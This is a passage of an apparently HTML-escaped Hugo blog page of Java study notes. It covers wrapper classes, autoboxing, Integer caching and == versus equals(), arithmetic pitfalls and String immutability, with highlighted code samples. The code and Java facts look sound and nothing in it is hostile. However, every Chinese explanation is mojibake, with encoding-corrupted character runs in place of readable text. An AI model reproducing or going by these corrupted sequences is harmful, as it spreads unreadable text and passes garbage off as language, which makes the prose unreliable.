&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>æ¯ç§åŸºæœ¬ç±»åž‹éƒ½æœ‰å…¶åŒ…è£…ç±»åž‹&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">åŸºæœ¬ç±»åž‹&lt;/th>
&lt;th style="text-align:left">å¯¹åº”çš„å¼•ç”¨ç±»åž‹&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">boolean&lt;/td>
&lt;td style="text-align:left">java.lang.Boolean&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">byte&lt;/td>
&lt;td style="text-align:left">java.lang.Byte&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">short&lt;/td>
&lt;td style="text-align:left">java.lang.Short&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">int&lt;/td>
&lt;td style="text-align:left">java.lang.Integer&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">long&lt;/td>
&lt;td style="text-align:left">java.lang.Long&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">float&lt;/td>
&lt;td style="text-align:left">java.lang.Float&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">double&lt;/td>
&lt;td style="text-align:left">java.lang.Double&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:left">char&lt;/td>
&lt;td style="text-align:left">java.lang.Character&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>æ‰€æœ‰çš„æ•´æ•°å’Œæµ®ç‚¹æ•°çš„åŒ…è£…ç±»åž‹éƒ½ç»§æ‰¿è‡ª&lt;code>Number&lt;/code>ï¼Œå› æ­¤ï¼Œå¯ä»¥éžå¸¸æ–¹ä¾¿åœ°ç›´æŽ¥é€šè¿‡åŒ…è£…ç±»åž‹èŽ·å–å„ç§åŸºæœ¬ç±»åž‹&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// å‘ä¸Šè½¬åž‹ä¸ºNumber:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Number&lt;/span> &lt;span style="color:#111">num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">999&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// èŽ·å–byte, int, long, float, double:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">byteValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">intValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">ln&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">longValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">floatValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">double&lt;/span> &lt;span style="color:#111">d&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">doubleValue&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>ç”±äºŽjavaä¸­å¹¶ä¸å­˜åœ¨æ— ç¬¦å·æ•´åž‹è¿™ä¸€è¯´ï¼Œå…¨éƒ¨éƒ½æ˜¯æœ‰æ•´åž‹çš„ï¼Œéœ€è¦é€šè¿‡åŒ…è£…ç±»åž‹çš„é™æ€æ–¹æ³•æ¥å®Œæˆï¼Œæ¯”å¦‚&lt;code>Byte.toUnsignedInt()&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>int&lt;/code>å’Œå¯¹åº”çš„&lt;code>Integer&lt;/code>å¯ä»¥äº’ç›¸è½¬åŒ–ï¼Œç”šè‡³ç›´æŽ¥ä½¿ç”¨&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>Integer n = 100; // ç¼–è¯‘å™¨è‡ªåŠ¨ä½¿ç”¨Integer.valueOf(int)
int x = n; // ç¼–è¯‘å™¨è‡ªåŠ¨ä½¿ç”¨Integer.intValue()
&lt;/code>&lt;/pre>&lt;p>è¿™ç§ç›´æŽ¥æŠŠ&lt;code>int&lt;/code>å˜ä¸º&lt;code>Integer&lt;/code>çš„èµ‹å€¼å†™æ³•ï¼Œç§°ä¸ºè‡ªåŠ¨è£…ç®±ï¼ˆAuto Boxingï¼‰ï¼›åè¿‡æ¥ï¼ŒæŠŠ&lt;code>Integer&lt;/code>å˜ä¸º&lt;code>int&lt;/code>çš„èµ‹å€¼å†™æ³•ï¼Œç§°ä¸ºè‡ªåŠ¨æ‹†ç®±ï¼ˆAuto Unboxingï¼‰&lt;/p>
&lt;p>æ³¨æ„ï¼šè‡ªåŠ¨è£…ç®±å’Œè‡ªåŠ¨æ‹†ç®±åªå‘ç”Ÿåœ¨ç¼–è¯‘é˜¶æ®µï¼Œç›®çš„æ˜¯ä¸ºäº†å°‘å†™ä»£ç ã€‚&lt;/p>
&lt;p>è£…ç®±å’Œæ‹†ç®±ä¼šå½±å“ä»£ç çš„æ‰§è¡Œæ•ˆçŽ‡ï¼Œå› ä¸ºç¼–è¯‘åŽçš„&lt;code>class&lt;/code>ä»£ç æ˜¯ä¸¥æ ¼åŒºåˆ†åŸºæœ¬ç±»åž‹å’Œå¼•ç”¨ç±»åž‹çš„ã€‚å¹¶ä¸”ï¼Œè‡ªåŠ¨æ‹†ç®±æ‰§è¡Œæ—¶å¯èƒ½ä¼šæŠ¥&lt;code>NullPointerException&lt;/code>ï¼ˆä¸¤ç§ç±»åž‹å¯¹nullçš„å®¹å¿åº¦ä¸åŒ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// NullPointerException
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>æ‰€æœ‰åŒ…è£…ç±»åž‹éƒ½æ˜¯ä¸å˜ç±»ï¼Œå’ŒStringä¸€æ ·é€šè¿‡å†…éƒ¨çš„&lt;code>private final int&lt;/code>å­—æ®µå®žçŽ°ï¼Œæ— æ³•æ´¾ç”Ÿå­ç±»&lt;/li>
&lt;li>åˆ¤æ–­å€¼ç±»åž‹çš„å˜é‡æ˜¯å¦ç›¸ç­‰å¯ç”¨&lt;code>==&lt;/code>ï¼Œä½†æ˜¯åŒ…è£…ç±»åž‹å¿…é¡»ç”¨&lt;code>equals&lt;/code>æ¯”è¾ƒï¼ˆå¼•ç”¨ç±»åž‹å­˜åœ¨å€¼ç›¸ç­‰ä½†æŒ‡å‘ä¸åŒå¯¹è±¡çš„æƒ…å†µï¼‰ï¼ï¼ï¼è¯¦ç»†çš„æ¼”ç¤º&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">127&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">127&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">99999&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">99999&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;x == y: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;m == n: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;x.equals(y): &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;m.equals(n): &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>==&lt;/code>æ¯”è¾ƒï¼Œè¾ƒå°çš„ä¸¤ä¸ªç›¸åŒçš„&lt;code>Integer&lt;/code>è¿”å›ž&lt;code>true&lt;/code>ï¼Œè¾ƒå¤§çš„ä¸¤ä¸ªç›¸åŒçš„&lt;code>Integer&lt;/code>è¿”å›ž&lt;code>false&lt;/code>ï¼Œè¿™æ˜¯å› ä¸º&lt;code>Integer&lt;/code>æ˜¯ä¸å˜ç±»ï¼Œç¼–è¯‘å™¨æŠŠ&lt;code>Integer x = 127;&lt;/code>è‡ªåŠ¨å˜ä¸º&lt;code>Integer x = Integer.valueOf(127);&lt;/code>&lt;/p>
&lt;p>ä¸ºäº†èŠ‚çœå†…å­˜ï¼Œ&lt;code>Integer.valueOf()&lt;/code>å¯¹äºŽè¾ƒå°çš„æ•°ï¼Œå§‹ç»ˆè¿”å›žç›¸åŒçš„å®žä¾‹ï¼Œå› æ­¤&lt;code>==&lt;/code>æ¯”è¾ƒâ€œæ°å¥½â€ä¸º&lt;code>true&lt;/code>ï¼Œä½†æˆ‘ä»¬ç»ä¸èƒ½å› ä¸ºJavaæ ‡å‡†åº“çš„&lt;code>Integer&lt;/code>å†…éƒ¨æœ‰ç¼“å­˜ä¼˜åŒ–å°±ç”¨&lt;code>==&lt;/code>æ¯”è¾ƒï¼Œå¿…é¡»ç”¨&lt;code>equals()&lt;/code>æ–¹æ³•æ¯”è¾ƒä¸¤ä¸ª&lt;code>Integer&lt;/code>&lt;/p>
&lt;ul>
&lt;li>å› ä¸º&lt;code>Integer.valueOf()&lt;/code>å¯èƒ½å§‹ç»ˆè¿”å›žåŒä¸€ä¸ª&lt;code>Integer&lt;/code>å®žä¾‹ï¼Œå› æ­¤ï¼Œåœ¨æˆ‘ä»¬è‡ªå·±åˆ›å»º&lt;code>Integer&lt;/code>çš„æ—¶å€™ï¼Œä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>Integer n = new Integer(100);
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>Integer n = Integer.valueOf(100);
&lt;/code>&lt;/pre>&lt;p>æ–¹æ³•äºŒæ›´å¥½ï¼Œä¸ç”¨æ¯æ¬¡éƒ½newæ–°çš„å®žä¾‹è€Œæ˜¯ç›´æŽ¥ä½¿ç”¨é™æ€å·¥åŽ‚æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼Œå®ƒä¼šåšåˆ°å†…éƒ¨ä¼˜åŒ–ï¼Œå°½å¯èƒ½åœ°è¿”å›žç¼“å­˜çš„å®žä¾‹ä»¥èŠ‚çœå†…å­˜&lt;/p>
&lt;ul>
&lt;li>&lt;code>String&lt;/code>ä½œå¼•ç”¨ç±»åž‹ï¼Œç±»ä¼¼cä¸­çš„æŒ‡é’ˆï¼Œå†…éƒ¨å­˜å‚¨ä¸€ä¸ªæŒ‡å‘å†…å­˜ä¸­çš„åœ°å€&lt;/li>
&lt;li>åŠ ä¸Š&lt;code>final&lt;/code>è¡¨ç¤ºå¸¸é‡ï¼Œåˆ›å»ºå®žä¾‹åŽæ— æ³•ä¿®æ”¹&lt;/li>
&lt;li>ç±»åž‹åè¿‡é•¿æ—¶å¯ç”¨&lt;code>var&lt;/code>ä»£æ›¿&lt;/li>
&lt;li>&lt;code>instanceof()&lt;/code>ç¡®å®šç±»åž‹&lt;/li>
&lt;/ul>
&lt;h3 id="è¿ç®—">è¿ç®—&lt;/h3>
&lt;ul>
&lt;li>æº¢å‡ºä¸æŠ¥é”™ï¼Œæ³¨æ„è‡ªæ£€&lt;/li>
&lt;li>ä¼˜å…ˆçº§å¤ªå¤šè®°ä¸ä½ï¼Œç»Ÿä¸€åŠ æ‹¬å·å®Œäº‹äº†&lt;/li>
&lt;li>ä¸¤ç§ç±»åž‹ä¸åŒçš„æ•°è¿›è¡Œè¿ç®—æ—¶ä¼šå­˜åœ¨ç±»åž‹çš„éšå¼è½¬æ¢ï¼ˆshort+int -&amp;gt; int+intï¼‰ï¼Œæ³¨æ„è¿ç®—ç²¾åº¦&lt;/li>
&lt;li>æ•´æ•°è¿ç®—å¾ˆå‡†ç¡®ï¼Œæ²¡æœ‰å¿…è¦ä¸ºäº†èŠ‚çœå†…å­˜è€Œä½¿ç”¨&lt;code>byte&lt;/code>å’Œ&lt;code>short&lt;/code>è¿›è¡Œæ•´æ•°è¿ç®—&lt;/li>
&lt;li>æ•´æ•°è¿ç®—åœ¨é™¤æ•°ä¸º&lt;code>0&lt;/code>æ—¶ä¼šæŠ¥é”™ï¼Œè€Œæµ®ç‚¹æ•°è¿ç®—åœ¨é™¤æ•°ä¸º&lt;code>0&lt;/code>æ—¶ï¼Œä¸ä¼šæŠ¥é”™ï¼Œè¿”å›ž&lt;code>NAN&lt;/code> or &lt;code>Infinity&lt;/code> or &lt;code>-Infinity&lt;/code>&lt;/li>
&lt;li>å¸ƒå°”å…³ç³»å’Œä¸‰å…ƒè¿ç®—ä¸­æ³¨æ„é€»è¾‘çŸ­è·¯&lt;/li>
&lt;li>ä¸‰å…ƒè¿ç®—&lt;code>b ? x : y&lt;/code>åŽé¢çš„ç±»åž‹å¿…é¡»ç›¸åŒ&lt;/li>
&lt;/ul>
&lt;h3 id="å­—ç¬¦å­—ç¬¦ä¸²">å­—ç¬¦&amp;amp;å­—ç¬¦ä¸²&lt;/h3>
&lt;ul>
&lt;li>Javaçš„&lt;code>String&lt;/code>å’Œ&lt;code>char&lt;/code>åœ¨å†…å­˜ä¸­æ€»æ˜¯ä»¥Unicodeç¼–ç è¡¨ç¤º&lt;/li>
&lt;li>å­—ç¬¦charç”¨&lt;code>''&lt;/code>ï¼Œå­—ç¬¦ä¸²ç”¨&lt;code>&amp;quot;&amp;quot;&lt;/code>ï¼ˆç©ºå­—ç¬¦ä¸²ä¸ç­‰äºŽnullï¼‰ï¼Œå­—ç¬¦ä¸²æ‹¼æŽ¥å­˜åœ¨ç±»åž‹éšå¼è½¬æ¢ï¼Œ&lt;code>&amp;quot;&amp;quot;&amp;quot; &amp;quot;&amp;quot;&amp;quot;&lt;/code>å†™å¤šè¡Œå­—ç¬¦ä¸²ï¼ˆåŒpyï¼‰&lt;/li>
&lt;li>javaä¸­çš„å­—ç¬¦ä¸²èµ‹å€¼æ“ä½œå¯ç›´æŽ¥è”æƒ³cçš„æŒ‡é’ˆè¿›è¡Œç†è§£ï¼Œé€šè¿‡å†…éƒ¨çš„&lt;code>private final char[]&lt;/code>å­—æ®µ ä»¥åŠæ²¡æœ‰ä»»ä½•ä¿®æ”¹&lt;code>char[]&lt;/code>çš„æ–¹æ³•å®žçŽ°å­—ç¬¦ä¸²çš„ä¸å¯å˜æ€§ï¼›åŸºäºŽè¿™ä¸€ç‚¹ï¼Œå¦‚æžœä¼ å…¥çš„å¯¹è±¡æœ‰å¯èƒ½æ”¹å˜ï¼Œæˆ‘ä»¬éœ€è¦å¤åˆ¶è€Œä¸æ˜¯ç›´æŽ¥å¼•ç”¨&lt;/li>
&lt;li>å­—ç¬¦ä¸²æ¯”è¾ƒå¿…é¡»ç”¨&lt;code>equals()&lt;/code>æˆ–&lt;code>equalsIgnoreCase()&lt;/code>ï¼Œä¸å¯å·æ‡’ç”¨&lt;code>==&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>æ›´å¤šå­—ç¬¦ä¸²çš„ç”¨æ³•å¯å‡ ä¹Žç­‰åŒäºŽPythonï¼Œä¸åˆ—ä¸¾&lt;/p>
&lt;ul>
&lt;li>&lt;code>String&lt;/code>å’Œ&lt;code>char[]&lt;/code>ç±»åž‹å¯ä»¥äº’ç›¸è½¬æ¢&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>char[] cs = &amp;#34;Hello&amp;#34;.toCharArray(); // String -&amp;gt; char[]
String s = new String(cs); // char[] -&amp;gt; String
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>å¦‚æžœä¿®æ”¹äº†&lt;code>char[]&lt;/code>æ•°ç»„ï¼Œ&lt;code>String&lt;/code>å¹¶ä¸ä¼šæ”¹å˜&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">cs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toCharArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cs&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cs&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;X&amp;#39;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ˜¯å› ä¸ºé€šè¿‡&lt;code>new String(char[])&lt;/code>åˆ›å»ºæ–°çš„&lt;code>String&lt;/code>å®žä¾‹æ—¶ï¼Œå®ƒå¹¶ä¸ä¼šç›´æŽ¥å¼•ç”¨ä¼ å…¥çš„&lt;code>char[]&lt;/code>æ•°ç»„ï¼Œè€Œæ˜¯ä¼šå¤åˆ¶ä¸€ä»½ï¼Œæ‰€ä»¥ï¼Œä¿®æ”¹å¤–éƒ¨çš„&lt;code>char[]&lt;/code>æ•°ç»„ä¸ä¼šå½±å“&lt;code>String&lt;/code>å®žä¾‹å†…éƒ¨çš„&lt;code>char[]&lt;/code>æ•°ç»„ï¼Œå› ä¸ºè¿™æ˜¯ä¸¤ä¸ªä¸åŒçš„æ•°ç»„&lt;/p>
&lt;ul>
&lt;li>æ—©æœŸçš„Stringæ€»ä»¥char[]è¿›è¡Œå­˜å‚¨&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">String&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">offset&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
